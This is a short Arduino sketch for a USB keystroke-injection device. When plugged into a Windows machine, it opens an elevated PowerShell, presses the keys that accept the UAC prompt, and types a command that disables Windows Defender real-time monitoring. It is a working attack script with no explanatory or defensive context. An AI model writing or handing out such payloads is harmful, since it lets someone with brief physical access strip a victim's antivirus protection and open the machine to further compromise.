#include <phukdlib_leonardo.h>
#define kbd_es_es

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarMSWIN("powershell Start-Process powershell -Verb runAs");
  delay(5000);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(5000);
  Keyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
  delay(5000);
  Keyboard.println("exit");
  while(1);
  }
